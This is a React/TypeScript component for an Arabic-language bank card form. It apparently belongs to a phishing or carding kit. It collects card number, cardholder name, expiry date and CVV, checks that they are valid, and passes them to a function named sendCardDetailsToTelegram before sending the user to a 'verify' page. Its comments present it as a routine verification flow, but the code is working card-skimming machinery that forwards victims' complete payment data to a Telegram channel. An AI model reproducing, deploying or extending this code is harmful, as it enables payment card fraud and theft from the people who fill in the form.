import { Calendar, CreditCard, Lock, User } from "lucide-react";
import { ChangeEvent, FormEvent, useEffect, useState } from "react";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/dist/es/styles.scss";
import { useNavigate } from "react-router-dom";
import { sendCardDetailsToTelegram } from "../services/telegram";
import { useAppState } from "../store/AppStateContext";
import { CardData } from "../types";
import {
  formatCreditCardNumber,
  formatCVC,
  formatExpirationDate,
  getCardTypeFromNumber,
} from "../utils/cardUtils";

/**
 * Card Details Form Component
 *
 * Handles the collection and validation of credit card information
 * with a dynamic card visualization that updates in real-time.
 */
const CardDetailsForm = () => {
  const navigate = useNavigate();
  const { setCardData, setRequestId, setStatus, setError } = useAppState();
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Card form data with additional focused field for the card visualization
  const [formData, setFormData] = useState<CardData & { focused: string }>({
    cardNumber: "",
    cardholderName: "",
    expiryDate: "",
    cvv: "",
    focused: "",
  });

  // Validation errors state
  const [formErrors, setFormErrors] = useState({
    cardNumber: "",
    cardholderName: "",
    expiryDate: "",
    cvv: "",
  });

  // Detect card type for styling (not used in UI yet)
  const [_, setCardType] = useState("");

  /**
   * Updates card type when card number changes
   */
  useEffect(() => {
    if (formData.cardNumber) {
      const detectedType = getCardTypeFromNumber(formData.cardNumber);
      setCardType(detectedType);
    } else {
      setCardType("");
    }
  }, [formData.cardNumber]);

  /**
   * Handles input changes, formats data, and updates state
   */
  const handleInputChange = (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    // Format different fields appropriately
    let formattedValue = value;

    if (name === "cardNumber") {
      formattedValue = formatCreditCardNumber(value);
    } else if (name === "expiryDate") {
      formattedValue = formatExpirationDate(value);
    } else if (name === "cvv") {
      formattedValue = formatCVC(value);
    } else if (name === "cardholderName") {
      // Convert to uppercase for better card display
      formattedValue = value.toUpperCase();
    }

    // Update form data
    setFormData((prev) => ({
      ...prev,
      [name]: formattedValue,
    }));

    // Clear errors when user types
    if (formErrors[name as keyof typeof formErrors]) {
      setFormErrors({
        ...formErrors,
        [name]: "",
      });
    }
  };

  /**
   * Handles input focus for card flipping effect
   */
  const handleInputFocus = (e: React.FocusEvent<HTMLInputElement>) => {
    setFormData((prev: CardData & { focused: string }) => ({
      ...prev,
      focused: e.target.name,
    }));
  };

  /**
   * Validates form fields before submission
   */
  const validateForm = (): boolean => {
    const errors = {
      cardNumber: "",
      cardholderName: "",
      expiryDate: "",
      cvv: "",
    };
    let isValid = true;

    // Validate card number (16 digits)
    const cardNumberDigits = formData.cardNumber.replace(/\s/g, "");
    if (
      !cardNumberDigits ||
      cardNumberDigits.length < 15 ||
      cardNumberDigits.length > 16 ||
      !/^\d+$/.test(cardNumberDigits)
    ) {
      errors.cardNumber = "يرجى إدخال رقم بطاقة صالح مكون من 15-16 رقمًا";
      isValid = false;
    }

    // Validate cardholder name
    if (!formData.cardholderName.trim()) {
      errors.cardholderName = "اسم حامل البطاقة مطلوب";
      isValid = false;
    }

    // Validate expiry date (MM/YY format)
    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    if (!expiryRegex.test(formData.expiryDate)) {
      errors.expiryDate = "يرجى إدخال تاريخ انتهاء صالح (MM/YY)";
      isValid = false;
    } else {
      // Check if card is expired
      const [month, year] = formData.expiryDate.split("/");
      const expiryDate = new Date(
        2000 + parseInt(year),
        parseInt(month) - 1,
        1
      );
      const today = new Date();
      if (expiryDate < today) {
        errors.expiryDate = "البطاقة منتهية الصلاحية";
        isValid = false;
      }
    }

    // Validate CVV (3-4 digits)
    if (!/^\d{3,4}$/.test(formData.cvv)) {
      errors.cvv = "يرجى إدخال رمز CVV صالح (3-4 أرقام)";
      isValid = false;
    }

    setFormErrors(errors);
    return isValid;
  };

  /**
   * Handles form submission, validates data, and initiates verification process
   */
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();

    // Validate form before submission
    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);
    setError(null);

    try {
      // Prepare card data without 'focused' field
      const cardDataToSubmit = {
        cardNumber: formData.cardNumber,
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
      };

      // Send card details to Telegram and get a request ID
      const requestId = await sendCardDetailsToTelegram(cardDataToSubmit);

      // Update application state
      setCardData(cardDataToSubmit);
      setRequestId(requestId);
      setStatus("verifying");

      // Navigate to verification page
      navigate("/verify");
    } catch (error) {
      let errorMsg = "حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى.";
      if (error instanceof Error) {
        errorMsg = error.message;
      }
      setError(errorMsg);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-md w-full bg-white rounded-lg shadow-md overflow-hidden verification-card">
      <div className="py-4 px-6 bg-gradient-to-r from-primary to-primary-light">
        <h2 className="text-xl font-semibold text-white text-center">
          بيانات البطاقة المصرفية
        </h2>
      </div>

      {/* Dynamic Credit Card Visualization */}
      <div className="px-6 pt-6">
        <Cards
          number={formData.cardNumber}
          expiry={formData.expiryDate}
          cvc={formData.cvv}
          name={formData.cardholderName || "CARDHOLDER NAME"}
          focused={
            formData.focused as "name" | "number" | "expiry" | "cvc" | undefined
          }
        />
      </div>

      <form onSubmit={handleSubmit} className="py-6 px-6 space-y-5">
        <div className="space-y-1">
          <label className="block text-sm font-medium text-gray-700 text-right">
            رقم البطاقة
          </label>
          <div className="relative">
            <input
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              placeholder="0000 0000 0000 0000"
              maxLength={19}
              className="w-full pr-10 pl-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary text-left dir-ltr form-input"
              style={{ direction: "ltr" }}
            />
            <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
              <CreditCard size={18} />
            </div>
          </div>
          {formErrors.cardNumber && (
            <p className="text-sm text-red-600 text-right">
              {formErrors.cardNumber}
            </p>
          )}
        </div>

        <div className="space-y-1">
          <label className="block text-sm font-medium text-gray-700 text-right">
            اسم حامل البطاقة
          </label>
          <div className="relative">
            <input
              type="text"
              name="cardholderName"
              value={formData.cardholderName}
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              placeholder="JOHN DOE"
              className="w-full pr-10 pl-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary text-left dir-ltr uppercase form-input"
              style={{ direction: "ltr" }}
            />
            <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
              <User size={18} />
            </div>
          </div>
          {formErrors.cardholderName && (
            <p className="text-sm text-red-600 text-right">
              {formErrors.cardholderName}
            </p>
          )}
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-1">
            <label className="block text-sm font-medium text-gray-700 text-right">
              تاريخ الانتهاء
            </label>
            <div className="relative">
              <input
                type="text"
                name="expiryDate"
                value={formData.expiryDate}
                onChange={handleInputChange}
                onFocus={handleInputFocus}
                placeholder="MM/YY"
                maxLength={5}
                className="w-full pr-10 pl-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary text-left dir-ltr form-input"
                style={{ direction: "ltr" }}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
                <Calendar size={18} />
              </div>
            </div>
            {formErrors.expiryDate && (
              <p className="text-sm text-red-600 text-right">
                {formErrors.expiryDate}
              </p>
            )}
          </div>

          <div className="space-y-1">
            <label className="block text-sm font-medium text-gray-700 text-right">
              رمز الأمان
            </label>
            <div className="relative">
              <input
                type="text"
                name="cvv"
                value={formData.cvv}
                onChange={handleInputChange}
                onFocus={handleInputFocus}
                placeholder="CVV"
                maxLength={4}
                className="w-full pr-10 pl-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary text-left dir-ltr form-input"
                style={{ direction: "ltr" }}
                inputMode="numeric"
                pattern="[0-9]*"
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
                <Lock size={18} />
              </div>
            </div>
            {formErrors.cvv && (
              <p className="text-sm text-red-600 text-right">
                {formErrors.cvv}
              </p>
            )}
          </div>
        </div>

        <button
          type="submit"
          disabled={isSubmitting}
          className="btn-verification w-full mt-6"
        >
          {isSubmitting ? (
            <div className="flex items-center justify-center">
              <svg
                className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                ></path>
              </svg>
              جاري المعالجة...
            </div>
          ) : (
            "متابعة"
          )}
        </button>
      </form>
    </div>
  );
};

export default CardDetailsForm;
